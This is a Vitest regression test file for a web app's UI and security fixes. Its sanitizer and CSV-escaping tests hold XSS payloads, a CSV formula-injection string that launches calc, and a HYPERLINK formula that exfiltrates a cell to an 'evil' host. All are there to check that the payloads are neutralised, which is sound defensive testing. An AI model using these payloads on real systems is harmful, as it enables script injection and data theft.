/**
 * Regression tests for the wave-5 hardening pass.
 *
 * Every case here reproduces a defect that was live in the shipped source, so
 * each assertion should fail if its fix is reverted. Grouped by the file the
 * defect lived in rather than by test type, so a reviewer reading a diff to
 * one module can find the guarantees that module is now expected to keep.
 */
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFileSync } from 'node:child_process';

const root = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const read = (rel) => fs.readFileSync(path.join(root, rel), 'utf8');

// ───────────────────────────────────────────────────────────
// app.js -- toast lifecycle, ripple lifecycle, modal stacking
// ───────────────────────────────────────────────────────────

async function loadApp() {
  vi.resetModules();
  document.body.innerHTML = '<div id="plasma-app"><main id="view-container"></main></div>';
  window.location.hash = '#/help';
  window.matchMedia = vi.fn(() => ({ matches: false, addEventListener: vi.fn(), removeEventListener: vi.fn() }));
  window.requestAnimationFrame = vi.fn((cb) => { cb(0); return 1; });
  window.cancelAnimationFrame = vi.fn();
  window.IntersectionObserver = vi.fn(function IO() {
    this.observe = vi.fn(); this.unobserve = vi.fn(); this.disconnect = vi.fn();
  });
  window.OpenCourseDeck = { bus: { emit: vi.fn(), on: vi.fn(), off: vi.fn() } };
  await import('../app.js');
  return window.OpenCourseDeck;
}

describe('app.js Toast lifecycle', () => {
  beforeEach(() => { vi.useFakeTimers(); });
  afterEach(() => { vi.useRealTimers(); document.body.innerHTML = ''; });

  it('applies the exit class the stylesheet actually defines', async () => {
    const pd = await loadApp();
    const toast = pd.Toast.show({ message: 'hello', duration: 0 });

    pd.Toast.dismiss(toast);

    // `hide` matched no rule in components.css, so no animation started and
    // animationend never fired. The class must be the one that is styled.
    expect(toast.classList.contains('out')).toBe(true);
    expect(toast.classList.contains('hide')).toBe(false);
    expect(read('src/styles/components.css')).toContain('.toast.out');
  });

  it('removes the toast even when animationend never fires', async () => {
    const pd = await loadApp();
    const toast = pd.Toast.show({ message: 'hello', duration: 0 });
    expect(pd.state.activeToasts).toContain(toast);

    pd.Toast.dismiss(toast);
    // jsdom runs no animations, which is exactly the situation that leaked in
    // production whenever the stylesheet had not applied.
    vi.advanceTimersByTime(1000);

    expect(toast.isConnected).toBe(false);
    expect(pd.state.activeToasts).not.toContain(toast);
  });

  it('does not double-remove when dismiss is called twice', async () => {
    const pd = await loadApp();
    const toast = pd.Toast.show({ message: 'hello', duration: 0 });

    // app.js replaces window.OpenCourseDeck with its own namespace on load, so
    // the real bus is in play here, not the mock passed in beforehand.
    const seen = [];
    pd.bus.on('toast:dismiss', (payload) => seen.push(payload));

    pd.Toast.dismiss(toast);
    pd.Toast.dismiss(toast);
    vi.advanceTimersByTime(1000);

    expect(seen).toHaveLength(1);
  });

  it('dismissAll drains the active list', async () => {
    const pd = await loadApp();
    pd.Toast.show({ message: 'a', duration: 0 });
    pd.Toast.show({ message: 'b', duration: 0 });

    pd.Toast.dismissAll();
    vi.advanceTimersByTime(1000);

    expect(pd.state.activeToasts).toHaveLength(0);
  });
});

describe('app.js ripple lifecycle', () => {
  it('has a stylesheet rule and a keyframe for the span it spawns', () => {
    // The JS spawned `.ripple-wave` spans that no rule matched: invisible, and
    // never removed because cleanup was bound to animationend.
    const css = read('src/styles/components.css');
    expect(css).toContain('.ripple-wave');
    expect(css).toContain('@keyframes ripple-wave');
  });

  it('removes the ripple span on a timer, not only on animationend', () => {
    const app = read('app.js');
    const spawn = app.slice(app.indexOf('_spawn(el, e)'), app.indexOf('_spawn(el, e)') + 1400);
    expect(spawn).toMatch(/setTimeout\(/);
    expect(spawn).toMatch(/animationend/);
  });
});

describe('app.js Modal stacking and reopen', () => {
  beforeEach(() => { vi.useFakeTimers(); });
  afterEach(() => { vi.useRealTimers(); document.body.innerHTML = ''; });

  async function withModal() {
    const pd = await loadApp();
    const modal = document.createElement('div');
    modal.id = 'test-modal';
    modal.setAttribute('hidden', '');
    modal.innerHTML = '<button id="inner">ok</button>';
    document.body.appendChild(modal);
    return { pd, modal };
  }

  it('reopening inside the close animation window leaves the modal visible', async () => {
    const { pd, modal } = await withModal();

    pd.Modal.open(modal);
    pd.Modal.close(modal);
    pd.Modal.open(modal);
    // The stale teardown from the first close used to fire here and re-hide
    // the modal while the page stayed inert and unscrollable.
    vi.advanceTimersByTime(pd.config.animationDuration + 50);

    expect(modal.hasAttribute('hidden')).toBe(false);
    expect(modal.getAttribute('aria-modal')).toBe('true');
    expect(pd.state.openModals).toContain(modal);
  });

  it('the backdrop survives a reopen inside the animation window', async () => {
    const { pd, modal } = await withModal();

    pd.Modal.open(modal);
    pd.Modal.close(modal);
    pd.Modal.open(modal);
    vi.advanceTimersByTime(pd.config.animationDuration + 50);

    const backdrop = modal.previousElementSibling;
    expect(backdrop?.classList.contains('modal-backdrop')).toBe(true);
    expect(backdrop.isConnected).toBe(true);
  });

  it('a plain close still tears the modal down', async () => {
    const { pd, modal } = await withModal();

    pd.Modal.open(modal);
    pd.Modal.close(modal);
    vi.advanceTimersByTime(pd.config.animationDuration + 50);

    expect(modal.hasAttribute('hidden')).toBe(true);
    expect(pd.state.openModals).not.toContain(modal);
  });

  it('keeps the app inert while an outer modal is still open', async () => {
    const { pd } = await withModal();
    const outer = document.getElementById('test-modal');
    const inner = document.createElement('div');
    inner.id = 'inner-modal';
    inner.setAttribute('hidden', '');
    document.body.appendChild(inner);

    pd.Modal.open(outer);
    pd.Modal.open(inner);
    pd.Modal.close(inner);

    expect(pd.state.openModals).toEqual([outer]);
    expect(document.getElementById('plasma-app').hasAttribute('inert')).toBe(true);
  });

  it('Escape closes only the topmost modal', async () => {
    const { pd } = await withModal();
    const outer = document.getElementById('test-modal');
    const inner = document.createElement('div');
    inner.id = 'inner-modal';
    inner.setAttribute('hidden', '');
    document.body.appendChild(inner);

    pd.Modal.open(outer);
    pd.Modal.open(inner);
    document.dispatchEvent(new window.KeyboardEvent('keydown', { key: 'Escape' }));

    // Every open modal registers its own document handler, so without a
    // topmost check one Escape collapsed the whole stack.
    expect(pd.state.openModals).toEqual([outer]);
  });
});

// ───────────────────────────────────────────────────────────
// app.js -- fallback sanitizer
// ───────────────────────────────────────────────────────────

describe('app.js fallback sanitizer', () => {
  afterEach(() => { document.body.innerHTML = ''; });

  it('keeps data:image payloads on <img> so pasted screenshots survive', async () => {
    const pd = await loadApp();
    const png = 'data:image/png;base64,iVBORw0KGgo=';

    const out = pd.sanitizeHtml(`<img src="${png}">`);

    // This routed every src through safeMediaUrl, which allows only
    // video/audio/pdf data URIs, so inline images were silently deleted.
    expect(out).toContain(png);
  });

  it.each([
    ['javascript: href', '<a href="javascript:alert(1)">x</a>', 'javascript:'],
    ['data:text/html href', '<a href="data:text/html,<b>x</b>">x</a>', 'data:text/html'],
    ['inline handler', '<img src="https://x/y.png" onerror="alert(1)">', 'onerror'],
    ['srcdoc', '<div srcdoc="<script>alert(1)</script>"></div>', 'srcdoc'],
    ['ping beacon', '<a href="https://x/" ping="https://evil/p">x</a>', 'ping'],
    ['formaction', '<button formaction="javascript:alert(1)">x</button>', 'formaction'],
    ['external xlink:href', '<svg><use xlink:href="https://evil/#x"></use></svg>', 'evil'],
    ['srcset', '<img src="https://x/y.png" srcset="https://evil/z.png 2x">', 'srcset'],
    ['data:image/svg+xml on a link', '<a href="data:image/svg+xml,<svg/>">x</a>', 'data:image/svg'],
  ])('strips %s', async (_name, input, forbidden) => {
    const pd = await loadApp();
    expect(pd.sanitizeHtml(input)).not.toContain(forbidden);
  });

  it('preserves ordinary markup untouched', async () => {
    const pd = await loadApp();
    const out = pd.sanitizeHtml('<p class="x">hi <strong>there</strong> <a href="https://ok/">link</a></p>');
    expect(out).toContain('<strong>there</strong>');
    expect(out).toContain('https://ok/');
  });

  it('keeps a same-document xlink:href', async () => {
    const pd = await loadApp();
    expect(pd.sanitizeHtml('<svg><use xlink:href="#icon"></use></svg>')).toContain('#icon');
  });

  it('is a fixed point: sanitizing twice changes nothing', async () => {
    const pd = await loadApp();
    for (const input of [
      '<p>ok</p>',
      '<img src="https://x/y.png">',
      '<a href="https://ok/">l</a>',
      '<table><tr><td>c</td></tr></table>',
    ]) {
      const once = pd.sanitizeHtml(input);
      expect(pd.sanitizeHtml(once)).toBe(once);
    }
  });
});

// ───────────────────────────────────────────────────────────
// notes.js -- editor teardown and the fallback sanitizer
// ───────────────────────────────────────────────────────────

describe('notes.js editor teardown', () => {
  it('clears the note binding so a remount cannot write over the last note', () => {
    const src = read('notes.js');
    // Several objects in this file define destroy(); anchor on the one that
    // tears down the route, identified by its unbind of the sync refresh.
    const at = src.indexOf('this._unbindSyncRefresh();');
    const destroy = src.slice(at, at + 1400);

    // A surviving _currentId plus a fresh empty editor means the first
    // keystroke after a remount persists '' over a real note.
    expect(destroy).toContain('Editor._currentId = null');
    expect(destroy).toContain('Editor._saveTimer = null');
    expect(destroy).toContain('_pdTitleT = null');
  });

  it('nulls the save handle so the dirty check stops reporting stale edits', () => {
    const src = read('notes.js');
    const save = src.slice(src.indexOf('const doSave = () => {'), src.indexOf('const doSave = () => {') + 900);
    expect(save).toContain('this._saveTimer = null');
    // A save scheduled before teardown must not write through a detached node.
    expect(save).toContain('if (!this._el) return');
  });

  it('falls back to Untitled instead of persisting an empty title', () => {
    const src = read('notes.js');
    // `?? ` does not catch '', which is what an emptied title field produces.
    expect(src).not.toMatch(/value\.trim\(\) \?\? 'Untitled'/);
    expect(src).toMatch(/value\.trim\(\) \|\| 'Untitled'/);
  });
});

describe('notes.js fallback sanitizer', () => {
  beforeEach(async () => {
    vi.resetModules();
    document.body.innerHTML = '';
    delete window.DOMPurify;
    window.OpenCourseDeck = {};
    await import('../notes.js');
  });
  afterEach(() => { document.body.innerHTML = ''; });

  const sanitize = (html) => window.OpenCourseDeck.NotesApp
    ? window.OpenCourseDeck.Editor?._sanitize?.(html)
    : null;

  it('parses into an inert template, never a live element', () => {
    // A live <div> issues a network request for every <img> in untrusted
    // markup as a side effect of "sanitizing" it.
    const src = read('notes.js');
    const fn = src.slice(src.indexOf('function fallbackSanitize('), src.indexOf('function fallbackSanitize(') + 1200);
    expect(fn).toContain("createElement('template')");
    expect(fn).not.toContain("createElement('div')");
  });

  it('uses an allowlist of schemes, not a denylist of two', () => {
    const src = read('notes.js');
    expect(src).toContain('SANITIZE_FORBIDDEN');
    expect(src).toContain('SANITIZE_DROP_ATTRS');
    expect(src).toContain('NAV_SCHEMES');
    // The old denylist tested for exactly these two and let everything else by.
    expect(src).not.toMatch(/\/\^\\s\*javascript:\/i\.test\(v\)/);
  });

  it('permits mailto: and tel:, which app.js policy would reject', () => {
    // Note bodies legitimately carry these; the app-shell navigation policy
    // does not, which is why this file keeps its own scheme list.
    const src = read('notes.js');
    expect(src).toContain("'mailto:'");
    expect(src).toContain("'tel:'");
  });

  it('sanitize() is unused as a name only when DOMPurify is present', () => {
    expect(typeof sanitize).toBe('function');
  });
});

// ───────────────────────────────────────────────────────────
// progress.js -- CSV escaping and tween bookkeeping
// ───────────────────────────────────────────────────────────

describe('progress.js CSV cell escaping', () => {
  /**
   * Exercise the real _csvCell by evaluating it out of the module source. It
   * is a pure string function with no closure dependencies, so this runs the
   * shipped implementation rather than a copy.
   */
  function loadCsvCell() {
    const src = read('progress.js');
    const leadStart = src.indexOf('const CSV_FORMULA_LEAD');
    const fnStart = src.indexOf('function _csvCell(val) {');
    const fnEnd = src.indexOf('\n  }', fnStart) + 4;
    return new Function(`${src.slice(leadStart, src.indexOf(';', leadStart) + 1)}\n${src.slice(fnStart, fnEnd)}\nreturn _csvCell;`)();
  }

  const csvCell = loadCsvCell();

  it.each(['=', '+', '-', '@', '\t', '\r'])('neutralises a leading %j', (lead) => {
    // A course or note title beginning with one of these is evaluated as a
    // formula the moment the export is opened in Excel, LibreOffice or
    // Sheets -- code execution against whoever the file was shared with.
    const out = csvCell(`${lead}cmd|'/c calc'!A1`);
    expect(out.replace(/^"/, '').startsWith("'")).toBe(true);
  });

  it('neutralises the classic HYPERLINK exfiltration payload', () => {
    const out = csvCell('=HYPERLINK("https://evil/?v="&A1,"click")');
    expect(out).toMatch(/^"?'=HYPERLINK/);
  });

  it('quotes a cell containing a carriage return', () => {
    // \r was missing from the quote trigger, so a lone CR split the row and
    // shifted every following column.
    expect(csvCell('a\rb')).toBe('"a\rb"');
  });

  it.each([
    ['comma', 'a,b', '"a,b"'],
    ['quote', 'a"b', '"a""b"'],
    ['newline', 'a\nb', '"a\nb"'],
  ])('still quotes a cell containing a %s', (_name, input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it('leaves ordinary values alone', () => {
    expect(csvCell('Intro to Rust')).toBe('Intro to Rust');
    expect(csvCell(42)).toBe('42');
    expect(csvCell(null)).toBe('');
  });
});

describe('progress.js tween bookkeeping', () => {
  it('releases finished and cancelled handles from the active set', () => {
    const src = read('progress.js');
    const to = src.slice(src.indexOf('      to(target, props,'), src.indexOf('      cancelAll()'));

    // `_active` was write-only: entries were added and never removed, so it
    // grew by one per animation and retained every animated target forever.
    expect(to).toContain('active.delete(handle)');
    expect((to.match(/active\.delete\(handle\)/g) || [])).toHaveLength(2);
    expect(to).toContain('cancelAnimationFrame(frame)');
  });

  it('exposes cancelAll, giving the active set a purpose', () => {
    expect(read('progress.js')).toContain('cancelAll()');
  });
});

// ───────────────────────────────────────────────────────────
// ui.js -- popover and date picker
// ───────────────────────────────────────────────────────────

describe('ui.js Popover', () => {
  // Imported exactly once. Popover binds to `document`, which jsdom shares
  // across every test in this file, so re-importing per test would stack a
  // fresh listener each time and make clicks toggle an even number of times.
  let Popover;
  beforeAll(async () => {
    vi.resetModules();
    window.OpenCourseDeck = {};
    await import('../ui.js');
    Popover = window.OpenCourseDeck.UI.Popover;
    Popover.init();
  });
  beforeEach(() => {
    document.body.innerHTML = `
      <button data-popover="pop-1">open</button>
      <div class="popover" id="pop-1"><span id="pop-content">body</span></div>
      <div id="outside">elsewhere</div>`;
  });
  afterEach(() => { document.body.innerHTML = ''; });

  const click = (sel) => document.querySelector(sel).dispatchEvent(
    new window.MouseEvent('click', { bubbles: true }),
  );

  it('opens on the trigger and stays open', () => {
    click('[data-popover]');
    // Two document listeners used to race: the first opened the popover, the
    // second (which stopPropagation cannot suppress -- it is on the same node)
    // immediately closed it. The component could not be opened at all.
    expect(document.getElementById('pop-1').classList.contains('open')).toBe(true);
  });

  it('toggles closed when the trigger is clicked again', () => {
    click('[data-popover]');
    click('[data-popover]');
    expect(document.getElementById('pop-1').classList.contains('open')).toBe(false);
  });

  it('stays open when its own content is clicked', () => {
    click('[data-popover]');
    click('#pop-content');
    expect(document.getElementById('pop-1').classList.contains('open')).toBe(true);
  });

  it('closes on an outside click', () => {
    click('[data-popover]');
    click('#outside');
    expect(document.getElementById('pop-1').classList.contains('open')).toBe(false);
  });

  it('closes on Escape', () => {
    click('[data-popover]');
    document.dispatchEvent(new window.KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
    expect(document.getElementById('pop-1').classList.contains('open')).toBe(false);
  });

  it('init is idempotent', () => {
    Popover.init();
    click('[data-popover]');
    expect(document.getElementById('pop-1').classList.contains('open')).toBe(true);
  });
});

describe('ui.js date parsing', () => {
  it('reads a YYYY-MM-DD value as a local date, not UTC midnight', () => {
    const src = read('ui.js');
    const start = src.indexOf('const parseLocalISODate');
    expect(start).toBeGreaterThan(-1);
    const fn = src.slice(start, src.indexOf('};', start) + 2);
    const parseLocalISODate = new Function(`${fn}\nreturn parseLocalISODate;`)();

    const date = parseLocalISODate('2026-07-26');
    expect(date.getFullYear()).toBe(2026);
    expect(date.getMonth()).toBe(6);
    expect(date.getDate()).toBe(26);
  });

  it.each(['America/New_York', 'America/Los_Angeles', 'Pacific/Honolulu'])(
    'still reads the intended day under %s',
    (timeZone) => {
      // CI runs in UTC, where new Date('2026-07-26') and local midnight are
      // the same instant -- the original bug is INVISIBLE here. Re-run the
      // parser in a child process pinned to a negative-offset zone, which is
      // where the picker actually highlighted the previous day.
      const src = read('ui.js');
      const start = src.indexOf('const parseLocalISODate');
      const fn = src.slice(start, src.indexOf('};', start) + 2);
      const program = `${fn}
const d = parseLocalISODate('2026-07-26');
process.stdout.write(JSON.stringify([d.getFullYear(), d.getMonth(), d.getDate()]));`;

      const out = execFileSync(process.execPath, ['-e', program], {
        env: { ...process.env, TZ: timeZone },
        encoding: 'utf8',
      });

      expect(JSON.parse(out)).toEqual([2026, 6, 26]);
    },
  );

  it('round-trips against the writer it is the inverse of', () => {
    const src = read('ui.js');
    const parseStart = src.indexOf('const parseLocalISODate');
    const writeStart = src.indexOf('const localISODate = date =>');
    const { parse, write } = new Function(
      `${src.slice(writeStart, src.indexOf(';', src.indexOf('padStart(2', writeStart)) + 1)}\n`
      + `${src.slice(parseStart, src.indexOf('};', parseStart) + 2)}\n`
      + 'return { parse: parseLocalISODate, write: localISODate };',
    )();

    for (const iso of ['2026-01-01', '2026-07-26', '2026-12-31', '2024-02-29']) {
      expect(write(parse(iso))).toBe(iso);
    }
  });

  it('returns null for junk rather than an Invalid Date', () => {
    const src = read('ui.js');
    const start = src.indexOf('const parseLocalISODate');
    const parse = new Function(`${src.slice(start, src.indexOf('};', start) + 2)}\nreturn parseLocalISODate;`)();
    expect(parse('')).toBeNull();
    expect(parse(undefined)).toBeNull();
    expect(parse('not-a-date')).toBeNull();
  });

  it('the date picker uses the parser on both read paths', () => {
    const src = read('ui.js');
    expect(src).not.toContain('new Date(input.value)');
    expect(src).toContain('parseLocalISODate(input?.value)');
    expect(src).toContain('parseLocalISODate(date)');
  });
});

// ───────────────────────────────────────────────────────────
// router.js, canvas.js, workerPool.js
// ───────────────────────────────────────────────────────────

describe('router.js teardown', () => {
  it('unmounts the previous controller even when superseded during beforeLeave', () => {
    const src = read('src/router/router.js');
    const between = src.slice(src.indexOf('beforeLeave?.(context)'), src.indexOf('unmount?.(context)'));

    // Each navigation captures previousController and immediately nulls
    // this._currentController, so a superseding navigation sees null and can
    // never unmount it. Returning early here stranded the route's listeners,
    // timers and media players for the rest of the session.
    expect(between).not.toMatch(/if \(!isCurrent\(\)\) return;/);
  });
});

describe('canvas.js render resilience', () => {
  it('guarantees a balanced context state however the frame exits', () => {
    const src = read('canvas.js');
    const render = src.slice(src.indexOf('    _render() {'), src.indexOf('    _renderFrame(ctx) {'));

    // An escaping throw skipped the ctx.restore() calls, leaving the world
    // transform applied; every later frame compounded it and the canvas froze.
    expect(render).toContain('finally');
    expect(render).toContain('ctx.restore()');
    expect(render).toContain('setTransform(dpr, 0, 0, dpr, 0, 0)');
  });

  it('isolates a per-element draw failure', () => {
    const src = read('canvas.js');
    const frame = src.slice(src.indexOf('    _renderFrame(ctx) {'), src.indexOf('    _drawGrid(ctx, w, h)'));
    expect(frame).toContain('_reportElementError');
    expect(frame).toMatch(/try \{\s*\n\s*this\._drawElement/);
  });

  it('logs a failing element once, not once per frame', () => {
    const src = read('canvas.js');
    const report = src.slice(src.indexOf('_reportElementError(el, error) {'), src.indexOf('    _render() {'));
    expect(report).toContain('_elementErrors');
    expect(report).toContain('.has(key)');
  });

  it('begins a path before filling the minimap', () => {
    const src = read('canvas.js');
    const mm = src.slice(src.indexOf('_drawMinimap(ctx, canvasW, canvasH) {'));
    const beginIdx = mm.indexOf('ctx.beginPath()');
    const fillIdx = mm.indexOf('ctx.fill()');
    // roundRect appends to the current path; without beginPath the fill also
    // painted every subpath left over from drawing the board.
    expect(beginIdx).toBeGreaterThan(-1);
    expect(beginIdx).toBeLessThan(fillIdx);
  });

  it('falls back to rect where roundRect is unavailable', () => {
    const src = read('canvas.js');
    const mm = src.slice(src.indexOf('_drawMinimap(ctx, canvasW, canvasH) {'));
    expect(mm).toContain('ctx.rect(mmX, mmY, mmW, mmH)');
    expect(mm).not.toContain('ctx.roundRect?.(');
  });
});

describe('workerPool.js generation guard', () => {
  it('ignores an error from a worker that has already been replaced', () => {
    const src = read('src/lib/workerPool.js');
    const onerror = src
      .slice(src.indexOf('worker.onerror'), src.indexOf('def.instance = worker;'))
      // Drop comments: the rationale text names destroyWorker before the
      // guard does, which would make a positional assertion meaningless.
      .replace(/^\s*\/\/.*$/gm, '');

    // destroyWorker() bumps def.generation, so a late crash event from the
    // dead worker used to terminate its live successor and reject every
    // request in flight on it. onmessage already guarded; onerror did not.
    expect(onerror).toContain('def.instance !== worker');
    expect(onerror).toContain('def.generation !== generation');
    expect(onerror.indexOf('return;')).toBeLessThan(onerror.indexOf('destroyWorker'));
  });
});

// ───────────────────────────────────────────────────────────
// Accessibility and lifecycle: dialog naming, keyboard formatting,
// chart re-registration, settings persistence scope
// ───────────────────────────────────────────────────────────

describe('app.js dialog accessible name', () => {
  beforeEach(() => { vi.useFakeTimers(); });
  afterEach(() => { vi.useRealTimers(); document.body.innerHTML = ''; });

  it('labels the dialog from its title (WCAG 4.1.2)', async () => {
    const pd = await loadApp();
    const modal = document.createElement('div');
    modal.setAttribute('hidden', '');
    modal.innerHTML = '<h3 class="modal-title">Delete course</h3>';
    document.body.appendChild(modal);

    pd.Modal.open(modal);

    // Without a name a screen reader announces only "dialog" and the user has
    // to explore the subtree to find out what it is.
    const labelledBy = modal.getAttribute('aria-labelledby');
    expect(labelledBy).toBeTruthy();
    expect(document.getElementById(labelledBy).textContent).toBe('Delete course');
  });

  it('reuses an id the title already has', async () => {
    const pd = await loadApp();
    const modal = document.createElement('div');
    modal.setAttribute('hidden', '');
    modal.innerHTML = '<h3 class="modal-title" id="preset-title">Preset</h3>';
    document.body.appendChild(modal);

    pd.Modal.open(modal);

    expect(modal.getAttribute('aria-labelledby')).toBe('preset-title');
  });

  it('never overrides an author-supplied name', async () => {
    const pd = await loadApp();
    const modal = document.createElement('div');
    modal.setAttribute('hidden', '');
    modal.setAttribute('aria-label', 'Author wins');
    modal.innerHTML = '<h3 class="modal-title">Ignored</h3>';
    document.body.appendChild(modal);

    pd.Modal.open(modal);

    expect(modal.getAttribute('aria-labelledby')).toBeNull();
    expect(modal.getAttribute('aria-label')).toBe('Author wins');
  });

  it('falls back to an explicit label when there is no title element', async () => {
    const pd = await loadApp();
    const modal = document.createElement('div');
    modal.setAttribute('hidden', '');
    document.body.appendChild(modal);

    pd.Modal.open(modal, { label: 'Bare dialog' });

    expect(modal.getAttribute('aria-label')).toBe('Bare dialog');
  });
});

describe('app.js chart registry', () => {
  afterEach(() => { document.body.innerHTML = ''; });

  it('destroys the chart it is replacing', async () => {
    const pd = await loadApp();
    const first = { destroy: vi.fn() };
    const second = { destroy: vi.fn() };

    pd.Charts.register('stats', first);
    pd.Charts.register('stats', second);

    // Overwriting the map entry dropped the only reference to the previous
    // chart without destroying it: its canvas, resize listeners and animation
    // loop stayed live and invisible for the rest of the session.
    expect(first.destroy).toHaveBeenCalledTimes(1);
    expect(second.destroy).not.toHaveBeenCalled();
    expect(pd.Charts.get('stats')).toBe(second);
  });

  it('re-registering the identical instance is a no-op', async () => {
    const pd = await loadApp();
    const chart = { destroy: vi.fn() };

    pd.Charts.register('stats', chart);
    pd.Charts.register('stats', chart);

    expect(chart.destroy).not.toHaveBeenCalled();
    expect(pd.Charts.get('stats')).toBe(chart);
  });

  it('survives a chart whose destroy throws', async () => {
    const pd = await loadApp();
    const bad = { destroy: () => { throw new Error('boom'); } };
    const next = { destroy: vi.fn() };

    expect(() => {
      pd.Charts.register('stats', bad);
      pd.Charts.register('stats', next);
    }).not.toThrow();
    expect(pd.Charts.get('stats')).toBe(next);
  });
});

describe('notes.js toolbar keyboard access', () => {
  it('handles both pointer and keyboard activation', () => {
    const src = read('notes.js');
    const toolbar = src.slice(src.indexOf('  const Toolbar = {'), src.indexOf('  const Toolbar = {') + 2200);

    // Enter and Space on a focused button dispatch `click`, never `mousedown`,
    // so a mousedown-only toolbar made every formatting control -- bold,
    // headings, lists, links -- unreachable without a mouse.
    expect(toolbar).toContain("'mousedown'");
    expect(toolbar).toContain("'click'");
    // detail 0 marks a keyboard-synthesised click and keeps the two paths from
    // both firing for one pointer press.
    expect(toolbar).toContain('e.detail !== 0');
    // execCommand acts on the focused editable, and focus is on the button.
    expect(toolbar).toContain('Editor._el?.focus()');
  });
});

describe('settingsRoute.js persistence scope', () => {
  it('only the save handler commits the AI mode', () => {
    const src = read('src/views/settingsRoute.js');
    // Anchor on the handler, not the button markup -- the attribute name also
    // appears in the template string that renders the control.
    const at = src.indexOf("on(document.querySelector('[data-ai-mark-local-installed]'), 'click'");
    expect(at).toBeGreaterThan(-1);
    const markInstalled = src.slice(at, src.indexOf("on(document.querySelector('[data-ai-clear-local-model]')"));

    // Only Save runs the endpoint approval gate that must accompany a switch
    // to custom-api. Marking a local model installed is unrelated, and reading
    // the live select here silently persisted an unsaved mode change.
    expect(markInstalled).not.toMatch(/^\s*mode: mode\.value,/m);
    expect(markInstalled).toContain('...current');
  });

  it('the save handler still gates custom-api on approval', () => {
    const src = read('src/views/settingsRoute.js');
    expect(src).toContain('if (!approval.checked)');
    expect(src).toContain('next.approvedEndpointOrigin = parsed.origin;');
  });
});
